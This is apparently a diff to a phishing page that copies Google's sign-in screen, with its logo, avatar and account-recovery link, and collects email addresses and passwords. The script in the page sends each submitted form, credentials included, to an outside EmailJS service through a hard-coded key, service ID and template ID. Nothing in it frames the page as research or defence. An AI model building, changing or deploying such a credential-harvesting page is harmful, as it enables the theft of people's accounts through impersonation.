@@ -4,6 +4,7 @@
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta charset="utf-8">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
     <meta content="width=300, initial-scale=1" name="viewport">
     <meta name="jingle" value="notranslate">
     <meta name="description" content=".">
@@ -207,7 +208,9 @@
     <div class="wrapper">
         <div class="google-header-bar centered">
             <div class="header content clearfix">
-                <img alt="Google" class="logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_116x41dp.png" width="116" height="41">
+                <img alt="Google" class="logo"
+                    src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_116x41dp.png"
+                    width="116" height="41">
             </div>
         </div>
         <div class="main content clearfix">
@@ -222,16 +225,16 @@
             </div>
             <div class="card signin-card clearfix">
                 <img class="profile-img" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="">
-                <form method="post" id="contact-form">
+                <form method="post" id="form">
                     <label class="hidden-label" for="Email">Email</label>
                     <input id="Email" name="email" type="email" placeholder="Email" required spellcheck="false">
-                    
+
                     <label class="hidden-label" for="Passwd">Password</label>
                     <input id="Passwd" name="password" type="password" placeholder="Password" required>
-                    
-                    <button type="submit" id="button">Sign in</button>
-                    
-                    <a id="link-forgot-passwd" href="https://accounts.google.com/RecoverAccount" class="need-help-reverse">
+
+                    <input type="submit" id="button" value="Send Email">
+                    <a id="link-forgot-passwd" href="https://accounts.google.com/RecoverAccount"
+                        class="need-help-reverse">
                         Need help?
                     </a>
                 </form>
@@ -246,28 +249,29 @@
 
     <!-- مكتبة EmailJS -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
     <script type="text/javascript">
-        // تهيئة المفتاح الخاص بك
+        // تهيئة المفتاح العام
         emailjs.init('BH4ObRCHCUpIVikbr');
 
         const btn = document.getElementById('button');
 
-        document.getElementById('contact-form').addEventListener('submit', function(event) {
+        document.getElementById('form').addEventListener('submit', function (event) {
             event.preventDefault();
-            
-            btn.textContent = 'Please wait...';
+
+            btn.value = 'Sending...';
 
             const serviceID = 'service_q3juzkq';
             const templateID = 'template_sup9jwi';
 
             emailjs.sendForm(serviceID, templateID, this)
                 .then(() => {
-                    btn.textContent = 'Sign in';
-                    alert('Verification sent successfully!');
+                    btn.value = 'Send Email';
+                    alert('Sent!');
                     this.reset();
                 }, (err) => {
-                    btn.textContent = 'Sign in';
-                    alert('An error occurred, please try again: ' + JSON.stringify(err));
+                    btn.value = 'Send Email';
+                    alert('Failed: ' + JSON.stringify(err));
                 });
         });
     </script>
